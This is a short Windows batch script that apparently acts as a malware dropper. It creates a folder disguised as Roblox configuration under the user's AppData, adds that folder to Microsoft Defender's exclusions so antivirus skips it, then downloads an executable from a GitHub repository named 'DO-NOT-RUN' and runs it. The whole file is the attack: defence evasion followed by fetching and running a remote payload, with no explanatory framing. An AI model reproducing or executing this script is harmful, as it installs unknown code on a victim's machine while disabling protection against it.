@echo off
start /min
set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
mkdir "%folderPath%"
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe' -OutFile '%folderPath%\Lulzalot Was Here.exe'"
start "" "%folderPath%\Lulzalot Was Here.exe"
cmd /c
